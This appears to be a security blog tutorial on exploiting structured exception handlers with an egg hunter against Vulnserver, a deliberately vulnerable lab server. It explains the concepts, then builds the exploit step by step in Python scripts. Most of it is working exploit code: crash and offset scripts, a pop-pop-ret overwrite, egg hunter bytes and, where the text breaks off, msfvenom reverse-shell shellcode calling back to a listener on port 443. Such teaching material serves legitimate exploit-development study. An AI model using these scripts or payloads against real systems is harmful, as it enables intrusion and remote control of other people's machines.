---
title:  "Exploit Development: Exception Handlers and Egg Hunters!"
date:   2019-03-22
tags: [posts]
excerpt: "Introduction to SEH exploits and utilizing egg hunters to achieve code execution."
---
Introduction
---
Exception handling is undoubtedly a vital element within the embodiment of software development. Far are the days of just scraping by with only getting applications to function. Developers need to be implementing graceful exits of programs, in case of any type of error. As the old adage states, "No good deed goes
unpunished." - the same applies to exception handlers. This blog post will give a brief introduction to exception handler exploits, along with how we can leverage a technique known as an egg hunter to smuggle shellcode when there is not enough room on our stack pointer, or any other place we can write uninterrupted.

Exception Handlers: How Do They Work?
---
Briefly I will hit on how these work (in Windows at least). Let's get acquainted some acronyms firstly. nSEH stands for next structured exception handler (we will get to why here in a second). SEH  (structured exception handler) is the current exception handler. Exception handlers are grouped into two types- operating system and developer implemented handlers. 

As we know, an application executed on a machine that utilizes a stack based data structure will give each function/piece of the application its own stack frame to be put onto the stack for execution. The stack frame of each function/piece will eventually be popped of when execution has ceased, and the next procedure is ready to be carried out. The same is true for an exception handler. If there is a function that has an exception handler embedded in itself- that exception handler will also get its own stack frame (when the exception is caught and then passed). Can you forsee a slight issue? Our exception handlers, when the exception is forwarded on, will be pushed onto the stack.

Now, refer to the names of our acronyms above. Notice anything? It looks like you could have a list of exception handlers. If you thought this, then you are correct! The handlers form a data structure known as a linked-list. You can conceptualize a linked-list as a set of data that all point to different things (at a high level). Here just know that the linked-list of elements (exception handlers) point to nSEH, nSEH,..., SEH. 

An exception handler need to be able to point to the nSEH (next handler) and SEH (current handler). When an exception is raised- the handler "zeroes out" a majority of the registers (ESI, EAX, ECX, etc. etc.). This, theoretically, should remove any user supplied data that is malicious. While this sounds like a tried and true way to prevent things like a stack based buffer overflow- this nomenclature is not without its flaws. 

Using this newfound knowledge, by the end of this article, we will cultivate a method to achieve code execution. Before we move on, take one note of a crucial attribute of nSEH at the time an exception is raised. nSEH will be located at `esp+8`. This means the location of ESP, plus 8 bytes, will be where nSEH resides.

Egg Hunters: Woah, Wait- Easter Is Here?
---
Let me preface this sentiment by saying egg hunters are not making an inference to the Easter Bunny. At a high level, egg hunters are a small piece of shellcode (around 32 bytes in most cases) that will be embedded with what we call as a tag. This same tag will also be appended two times in front of a larger piece of secondary shellcode, like a reverse shell, that is somewhere else in memory where an exploit developer can write to uninterrupted. 

The egg hunter will recursively search memory for two instances of its tag and will determine that when the two instances of the tag are located, that this is the piece of opcode you want to execute. After the second stage shellcode is located, a prompt execution of that shellcode will take place. The word that has gained the most notoriety as a tag over the years, is `w00t`. Egg hunters are a pretty clever way to circumvent constraints individuals may come across when trying to smuggle shellcode. Here is a well written white paper on [Egg Hunters](https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf). Let's move on :)

Down to the Nitty-Gritty
---
We will be taking crack at the [Vulnserver](https://github.com/stephenbradshaw/vulnserver). For reference and continuity, fuzzing the vulnerable command will not be within the scope of this post. Let's begin.

Initial Crash
---
When starting the application, we notice it starts listening on TCP port `9999`. We will take note of this for the future. After starting the server, we connect to it via `nc` on port 9999, and execute the command `HELP` to view a list of commands we can issue:

<img src="{{ site.url }}{{ site.baseurl }}/images/net9999.png" alt="">

After we view the list of commands, we learn there is a vulnerability within the `GMON` command. This was found through fuzzing. Fuzzing, at a very high level, means that we threw a bunch of junk characters at the vulnerable command to create a crash. Here is the PoC Python script we are going to execute to see if we can crash the application:
```console
root@kali:~/Desktop# cat CRASH.py 
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

pwn = "A" * 5000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
The application, which is attached to [Immunity Debugger](https://www.immunityinc.com/products/debugger/), crashes on the Windows machine where Vulnserver is running. We take note of something interesting. Although the application crashed, EIP was not overwritten with our user supplied data:

<img src="{{ site.url }}{{ site.baseurl }}/images/crash.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/crash1.png" alt="">

We can see clearly EIP is not overwritten. Will this throw us for a loop? Remember that these registers are all apart of the stack. What else do we recall is on the stack? That is right, exception handlers. Immunity (and OllyDbg) allow you to view the SEH chain to see what is happening with the exception handlers. To access this chain, click `View > SEH Chain`. Well, what do you know?! Our user supplied data hit nSEH and SEH, and they were corrupted with 41's in hexadecimal, or A's (which we sent).

<img src="{{ site.url }}{{ site.baseurl }}/images/SEH.png" alt="">

Calculating The Offset
---
Just like a vanilla instuction pointer overwrite, stack based buffer overflow- we need to find the offset to a particular place in memory where we can control the flow of execution. But without EIP- what can we do? We actually are going to leverage the SEH chain to write to EIP. Bear with me here. Firstly, before we do anything, we need to find the offset to the exception handlers. 

Since the SEH chain is a linked list, SEH will reside right next to nSEH. To find the offset, we are going to create a 5000 byte cyclic pattern string, that will help us determine where our handlers are. Here is the command to generate this in Metasploit:
```console 
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```
Here is our updated PoC script:
```console
root@kali:~/Desktop# cat OFFSET.py 
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

pwn = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
We then restart the application in Immunity Debugger, and throw our PoC (proof of concept) at Vulnserver. Again, the application crashes. This time, however, we know that the SEH chain can be overwritten by our supplied data. There is a really neat Python script known as [mona](https://github.com/corelan/mona) that can be ported into Immunity. We will run a mona command that will find any instances of cyclic patterns (like the one we supplied above). The command to issue that in Immunity is: `!mona findmsp`. 

You will need to issue this command in the white text bar at the bottom of the debugger, near the Windows start button. Here is what mona finds (you can right click on the first image below and open it in a new tab if it is too hard to read). I added a second picture to zoom in on the actual offset value:
<img src="{{ site.url }}{{ site.baseurl }}/images/cyclic.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/cyclic2.png" alt="">

We can conclude that is takes 3495 bytes of data to reach our exception handlers. Let's update our Python script to validate with a sanity check, by filling nSEH with B's (42 hex) and SEH with C's (43 hex). Recall- the exception handlers are in a linked-list. This tells you that SEH naturally would be right next to (4 bytes) nSEH. :
```console
root@kali:~/Desktop# cat VALIDATE.py 
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

pwn = "A" * 3495
pwn+= "B" * 4
pwn+= "C" * 4
pwn+= "D" * (5000-len(pwn))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
The above script sends 3495 bytes of data, to reach the location of nSEH. We are going to fill nSEH with 4 B's (42 hex) and SEH with 4 C's (43 hex). Remember, we concluded 5000 bytes was the appropriate amount of data to crash the server. We fill the rest of our data with D's, and take 5000 minus the A's, B's, and C's, to meet this stipulation.

Again, we execute our PoC after restarting the application in Immunity. The crash occurs, we view the SEH chain, and we validate that nSEH is overwritten by B's (42 hex) and SEH is overwritten by C's (43 hex).

<img src="{{ site.url }}{{ site.baseurl }}/images/SEH1.png" alt="">

The Importance of Pop Pop Ret
---
Awesome! We can control what gets stored in the SEH chain. You may be asking yourself, "How are we going to leverage this information?" Remember when I talked about the location of nSEH when an exception occurs? The value is `esp+8`. This is where that tidbit of information comes in handy. Let's take a step back and remember how assembler commands work for a second. 

A `pop` instruction will move whatever is on top of the stack (the stack pointer) into the register that comes after the `pop` command. An example is, if ESP contains the value 0012FFFF, and a `pop ecx` instruction is commenced, ECX will be filled with the data of ESP. ECX will now contain 0012FFFF. The stack (for our purposes here) grows downward to lower memory addresses. When a `pop` instruction is executed, the value of the current stack pointer (ESP) **INCREASES** by 4 bytes. A `ret`, or return, instruction will load the current value of the stack pointer into the instruction pointer (EIP). 

If we fill SEH with a `pop <register> pop <register> ret` chain we can move our current stack pointer (ESP) 8 bytes upward in memory (4 bytes for each `pop` instruction). If nSEH is located at the current ESP value plus 8 bytes, a `pop pop` sequence will take our current stack pointer and fill it with nSEH's value (which is `esp+8`). The last `ret` instruction, as explained above, will take our ESP (which now contains our nSEH value) and place it into EIP. Henceforth, we can control what gets loaded into the instruction pointer (EIP)! 

We don't actually mind that registers will be manipulated from our `pop pop ret` chain- we only care that ESP increases when a `pop` instruction is executed. Mona has a nice feature to search for `pop pop ret` chain. Here is the command used in Immunity: `!mona seh`(Again, I know it is hard to see, so i zoomed in on the addresses in the second image):

<img src="{{ site.url }}{{ site.baseurl }}/images/poppopret.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/again.png" alt="">

We need to obtain a memory address where a `pop <register> pop <register> ret` chain occurs. We also need to make sure the .DLL or .exe where this chain resides, was not compiled with ASLR or SafeSEH. It looks like we can use the last address in the above image, mentioned at: `0x625011b3`. Remember that Intel uses little endian format, which stores data with the least significant byte first. This will flip our address from `62 50 11 b3` to `b3 11 50 62`. Let's update our PoC once again:
```console
root@kali:~/Desktop# cat POPPOPRET.py 
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

pwn = "A" * 3495
pwn+= "B" * 4
pwn+= "\xb3\x11\x50\x62"
pwn+= "D" * (5000-3495-4-4)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
We restart our application in Immunity once again, and then we send our updated PoC. The application crashes, and we view the SEH chain. This time, we see a memory address has been loaded into SEH. We are going to set a breakpoint on this address. The breakpoint will pause execution of the program when the program reaches the instruction to which the breakpoint is set. To do this, we do one left-click on `essfunc.625011b3` and press `F2`:
<img src="{{ site.url }}{{ site.baseurl }}/images/breakpoint.png" alt="">

After pressing `F2` for the breakpoint, we then need to pass the exception to the application, to get our `pop pop ret` chain on the stack for execution. To do this press, `Shift + F9`:
<img src="{{ site.url }}{{ site.baseurl }}/images/step.png" alt="">

Excellent. Now, we will execute the `pop eax, pop eax, ret` chain, one instruction at a time, by stepping through them. Press `F7` to step through once to the second `pop` instruction, and then again to get to the `ret` instruction. Press `F7` one more time to execute `ret`, and you will notice that the program redirects us to the following place:
<img src="{{ site.url }}{{ site.baseurl }}/images/notice.png" alt="">

Notice where we are!!!! Look at the 3 values below our current instruction, in the above image! You will see 3 B's (42 hex), along with the current B (42 hex). We have landed in nSEH! More importantly, both of these values are on the stack if you look at the stack dump, shown below:
<img src="{{ site.url }}{{ site.baseurl }}/images/stack.png" alt="">

The address `00C0FFDC` is the "Pointer to next SEH record", which is nSEH. That address, as shown in image after we stepped through the `pop pop ret` chain, is the address of where our B's (42 hex) start. Awesome! Now what could we do from here? We could do a typical jump to ESP to execute shellcode! But we have a slight issue. ESP now only has the capacity to hold less than 30 bytes:

<img src="{{ site.url }}{{ site.baseurl }}/images/ugh.png" alt="">

Take the Jump!
---
This minute amount of space is not even enough for our egg hunter to go, much less opcode for a shell! What can we do? Well, one thing we are going to have to do is some math! A technique we can (and will) use, is to make a jump backwards into our "A" (41 hex) buffer, and store our egg hunter there. As you may or may not know, there are no actual negative numbers in hex. We can, however, use something known as the two's compliment to obtain a hex value that we can push onto the stack to make a backwards jump.

We need 32 bytes for our egg hunter, so let's jump 40 bytes backwards. I am not going to get into the low level math of the two's compliment (although it is not too difficult, and that is coming from someone who is subpar on a good day at arithmetic). Here is a [Two's Compliment Calculator](https://www.exploringbinary.com/twos-complement-converter/). Remember, the two's compliment is just a way to represent a negative number in hex. 

The two's compliment of -40 in binary is `1101 1000`. Converting this value to hex gives us `D8`. The opcode for a short jump is `EB`. We can use an instruction of `EB D8` to jump us back 40 bytes, in order to store our egg hunter! Let's update our PoC to reflect this and validate. (Remember that we are filling nSEH with the our jump instruction.):
```console
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

pwn = "A" * 3495
pwn+= "\xeb\xd8\x90\x90"
pwn+= "\xb3\x11\x50\x62"
pwn+= "D" * (5000-3495-4-4)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
Before we execute, take note of the `\x90` instructions, next to the jump opcode. These two added instructions are called no operations. "NOPS", as they are commonly characterised, are instructions that literally do not do anything (hence the name). The opcode is first recognized by the CPU. The CPU then disregards the NOP, and reads the next sequential instruction to be executed. We are using two "NOPs" here as place holders, because registers need four bytes loaded in them- and our jump opcode only provided two. Carrying on...

We restart the application in Immunity and we throw our PoC at it. Our Vulnserver application crashes, and we view the SEH chain. We set a breakpoint on SEH, as shown previously, and use `Shift + F9` to pass the exception to the application. We then step through our `pop pop ret` chain, and we land on our jump!!:

<img src="{{ site.url }}{{ site.baseurl }}/images/NOP.png" alt="">

We step though the jump withh `F7` and we land back in our A's:

<img src="{{ site.url }}{{ site.baseurl }}/images/validate.png" alt="">

Let's Go Huntin', Boys!
---
Now it is time to generate our egg hunter. We will do this with mona. This is the command I issued:
`!mona egg -t w00t`:

<img src="{{ site.url }}{{ site.baseurl }}/images/eggsy.png" alt="">

We now are going to update our PoC with the egg hunter, and I will explain the changes after I show them. Here is the new PoC:
```console
root@kali:~/Desktop# cat EGGSY.py 
#!/usr/bin/python
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

#Egg hunta = w00t 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

pwn = "A" * 3457
pwn+= egghunter
pwn+= "\x90\x90\x90\x90\x90\x90"
pwn+= "\xeb\xd8\x90\x90"
pwn+= "\xb3\x11\x50\x62"
pwn+= "D" * (5000-3495-4-4)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.134", 9999))

s.send(command+pwn)
s.recv(1024)
s.close()
```
Some questions you may have are probably: "Why did your initial `A` value go from `3495` to `3457`?" and "Why do you have six no operation instructions?" I will explain. So remember when we implemented the short jump backwards 40 bytes? We had to integrate two no operation instructions, because we only had two bytes to execute our jump (`EB` and `D8`). Those no operations can be omitted from our brains for the following calculations. 

We take our original offset of `3495` and we add two bytes (for our `EB D8` instruction). We now have a value of `3497`. Then, we went backwards 40 bytes. We now need to subtract that value. `3497 - 40` gives us `3457`. That is the offset to our egg hunter. There is a slight issue present now. We can reach our offset to the egg hunter- but there is still a gap between where our egg hunter resides in memory, and where our exception handlers are. If we add 32 bytes (the size of our egg hunter) to our current `3457` (where our egg hunter is located), we get `3489`. Thus, we are still six bytes short of our `3495` byte offset to nSEH and SEH. If we cannot reach nSEH or SEH- we cannot commence our execution of the SEH chain. Bearing this in mind, we must add these six bytes in before we can use our exception handlers to execute instructions on the stack. To compensate for this, we add those six bytes back in the form of a [NOP Sled](https://en.wikipedia.org/wiki/NOP_slide). This will give us a bit more reliability in our exploit, instead of just using A's. 

We then restart our application in Immunity, and chuck our PoC at the application. Business as usual- application crashes, open the SEH chain, put a breakpoint on SEH. `Shift + F9` to pass our exception to the program, step through our `pop pop ret` chain. We land at our jump. Step through the jump and voila! We have landed on our egg hunter:

<img src="{{ site.url }}{{ site.baseurl }}/images/voila.png" alt="">

Country Roads, Take Me Home
---
We now update our PoC into a weaponzied exploit. This exploit will return a shell over TCP port 443 to our machine. Here is what the exploit looks like, and I will explain what is happening:
```console
root@kali:~/Desktop# cat EXPLOIT.py 
import socket
import sys
import os

#Vulnerable command
command = "GMON /.:/"

#Egg hunta = w00t 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

#Shellcode generation = msfvenom -p windows/shell_reverse_tcp LHOST=172.16.55.69 LPORT=443 EXITFUNC=thread -b "\x00" -f c
shellcode=("\xb8\xcb\x5d\xb0\x5d\xdb\xd0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x83\xc3\x04\x03\x88\x53\x52\xa8\xf2\x84\x10"
"\x53\x0a\x55\x75\xdd\xef\x64\xb5\xb9\x64\xd6\x05\xc9\x28\xdb"
"\xee\x9f\xd8\x68\x82\x37\xef\xd9\x29\x6e\xde\xda\x02\x52\x41"
"\x59\x59\x87\xa1\x60\x92\xda\xa0\xa5\xcf\x17\xf0\x7e\x9b\x8a"
"\xe4\x0b\xd1\x16\x8f\x40\xf7\x1e\x6c\x10\xf6\x0f\x23\x2a\xa1"
"\x8f\xc2\xff\xd9\x99\xdc\x1c\xe7\x50\x57\xd6\x93\x62\xb1\x26"
"\x5b\xc8\xfc\x86\xae\x10\x39\x20\x51\x67\x33\x52\xec\x70\x80"
"\x28\x2a\xf4\x12\x8a\xb9\xae\xfe\x2a\x6d\x28\x75\x20\xda\x3e"
"\xd1\x25\xdd\x93\x6a\x51\x56\x12\xbc\xd3\x2c\x31\x18\xbf\xf7"
"\x58\x39\x65\x59\x64\x59\xc6\x06\xc0\x12\xeb\x53\x79\x79\x64"
